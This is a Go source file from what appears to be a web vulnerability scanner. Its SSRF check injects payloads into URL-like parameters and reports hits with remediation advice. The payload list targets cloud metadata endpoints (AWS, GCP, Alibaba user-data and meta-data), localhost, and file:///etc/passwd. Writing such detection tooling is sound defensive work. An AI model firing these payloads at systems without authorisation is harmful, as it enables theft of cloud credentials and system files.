package checks

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"

	"whiteclaw/scanner/models"
)

var ssrfTargets = []struct {
	payload string
	sig     string
	desc    string
}{
	{"http://169.254.169.254/latest/meta-data/", "ami-id", "AWS EC2 IMDSv1 metadata"},
	{"http://169.254.169.254/latest/user-data", "", "AWS EC2 user-data"},
	{"http://metadata.google.internal/computeMetadata/v1/", "computeMetadata", "GCP instance metadata"},
	{"http://100.100.100.200/latest/meta-data/", "metadata", "Alibaba Cloud metadata"},
	{"http://localhost/", "", "localhost loopback"},
	{"http://127.0.0.1/", "", "localhost (numeric)"},
	{"file:///etc/passwd", "root:x:", "file:// LFI via SSRF"},
}

// SSRF tests URL/URI parameters for server-side request forgery.
func SSRF(client *http.Client, cfg models.ScanConfig) {
	if len(cfg.Params) == 0 {
		return
	}
	// Only probe parameters that look URL-like
	urlKeys := []string{"url", "uri", "src", "dest", "redirect", "link", "href",
		"host", "endpoint", "proxy", "fetch", "load", "target"}
	var targets []string
	for _, p := range cfg.Params {
		pl := strings.ToLower(p)
		for _, k := range urlKeys {
			if strings.Contains(pl, k) {
				targets = append(targets, p)
				break
			}
		}
	}
	if len(targets) == 0 {
		return
	}

	models.Status(fmt.Sprintf("Testing SSRF (%d params)...", len(targets)))
	sem := newSem(cfg.Workers)
	var wg sync.WaitGroup
	reported := map[string]bool{}
	var mu sync.Mutex

	for _, param := range targets {
		for _, t := range ssrfTargets {
			wg.Add(1)
			param, t := param, t
			sem.Acquire()
			go func() {
				defer wg.Done()
				defer sem.Release()

				mu.Lock()
				already := reported[param]
				mu.Unlock()
				if already {
					return
				}

				injected := injectParam(cfg.URL, param, t.payload)
				req, err := http.NewRequest("GET", injected, nil)
				if err != nil {
					return
				}
				req.Header.Set("User-Agent", randomUA())
				resp, err := client.Do(req)
				if err != nil {
					return
				}
				defer resp.Body.Close()
				body, _ := io.ReadAll(io.LimitReader(resp.Body, 32*1024))

				hit := false
				if t.sig != "" {
					hit = strings.Contains(strings.ToLower(string(body)), strings.ToLower(t.sig))
				} else {
					hit = resp.StatusCode == 200 && len(body) > 0
				}

				if hit {
					mu.Lock()
					if !reported[param] {
						reported[param] = true
						mu.Unlock()
						models.Emit(models.Finding{
							Type:     "finding",
							Severity: "CRITICAL",
							Category: "vulnerabilities",
							Title:    fmt.Sprintf("SSRF via parameter %q (%s)", param, t.desc),
							Detail:   fmt.Sprintf("Server fetched internal resource.\nPayload: %s\nURL: %s", t.payload, injected),
							Fix:      "Block server-side requests to private IP ranges. Use an allowlist of permitted external domains. Enforce egress firewall rules.",
						})
					} else {
						mu.Unlock()
					}
				}
			}()
		}
	}
	wg.Wait()
}
